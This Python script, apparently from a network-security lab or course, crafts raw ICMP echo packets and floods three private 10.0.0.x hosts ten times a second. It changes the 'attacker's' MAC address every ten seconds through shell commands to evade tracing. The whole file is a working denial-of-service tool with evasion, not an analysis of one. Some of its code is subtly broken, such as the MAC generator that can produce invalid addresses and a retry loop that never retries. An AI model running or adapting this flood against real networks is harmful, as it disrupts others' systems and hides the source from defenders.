#!/usr/bin/env python3

'''
Citations
    https://itsfoss.com/change-mac-address-linux/
    https://agapow.net/programming/python/convert-timedelta-to-float/
'''

from multiprocessing.spawn import prepare
import socket, sys, struct, sys, random, time, binascii, os
from datetime import datetime
import subprocess

past_time = datetime.now()
mac_change_time = 10

def setup_connection():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error as msg:
        print('error ' + str(msg[0]) + ': ' + msg[1])
        sys.exit() 
    
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    return sock


def checksum(msg):  # Following RFC 1071 https://datatracker.ietf.org/doc/html/rfc1071
    s = 0
    for i in range(0, len(msg), 2):
        s = s + ord((chr)(msg[i])) + (ord((chr)(msg[i + 1])) << 8)
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    s = ~s & 0xffff
    return s


def get_ipv4_header(src_addr, dst_addr):
    len_and_ver = int(0x45)
    type_of_service = int(0x0)
    packet_length = int(0x54)
    frag_flags_and_offset = int(0x4000)
    packet_id = random.randint(0, 65535)
    ttl = int(0x40)
    proto_id = int(0x1)

    pre_chksm = struct.pack("!BBHHHBB", len_and_ver, type_of_service, packet_length, packet_id, frag_flags_and_offset, ttl, proto_id)
    ip_checksum = checksum(pre_chksm)
    ipv4_header = struct.pack("!BBHHHBBH", len_and_ver, type_of_service, packet_length, packet_id, frag_flags_and_offset, ttl, proto_id, ip_checksum) + socket.inet_aton(src_addr) + socket.inet_aton(dst_addr)
    return ipv4_header


def prepare_icmp_packet(source_ip, target_ip):
    ipv4_pkt = get_ipv4_header(source_ip, target_ip) 

    icmp_type = 8
    icmp_code = 0
    icmp_cksm = 0
    icmp_id   = 0
    icmp_seq_num  = 1
 
    icmp_hdr = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_cksm, icmp_id, icmp_seq_num)
    calc_cksm = hex(checksum(icmp_hdr))[2:]
    calc_cksm = int("0x" + calc_cksm[2:] + calc_cksm[0:2], 0)
    icmp_pkt = struct.pack("!BBHHH", icmp_type, icmp_code, calc_cksm, icmp_id, icmp_seq_num)

    return ipv4_pkt + icmp_pkt


# Generate a fake mac address with random numbers
def generate_random_mac():
    mac = ""
    for i in range(0,12,2):
        mac += "{}{}:".format(random.randint(0,9), random.randint(0,10))
    
    mac = mac[:-1]
    return mac


def send_icmp_packet(sock):
    global past_time
    while(True):
        
        # Changing the attacker's MAC address every 10 seconds
        if ((datetime.now() - past_time).seconds >  mac_change_time):
            os.system("ip link set dev eth0 down")

            #Ensuring that the fake macaddress is a valid one
            while(True):
                mac = generate_random_mac()
                cmd = "ip link set dev eth0 address {}".format(mac)
                try:
                    os.system(cmd)
                    print("Changed MAC => ", mac)
                    break
                except Exception as e:
                    pass

            os.system("ip link set dev eth0 up")
            past_time = datetime.now()

        # Sending the ICMP requests to every IP in the target list 10 times a second
        time.sleep(0.1)
        for target_ip in pkt_dict:
            pkt = pkt_dict[target_ip]
            sock.sendto(pkt, (target_ip, 0))


pkt_dict = {}

if __name__ == "__main__":

    source_ip = "10.0.0.21"
    target_list = ["10.0.0.22", "10.0.0.23", "10.0.0.24"]

    sock = setup_connection()
    for target_ip in target_list:
        pkt_dict[target_ip] = prepare_icmp_packet(source_ip, target_ip)
    
    send_icmp_packet(sock)
    sock.close()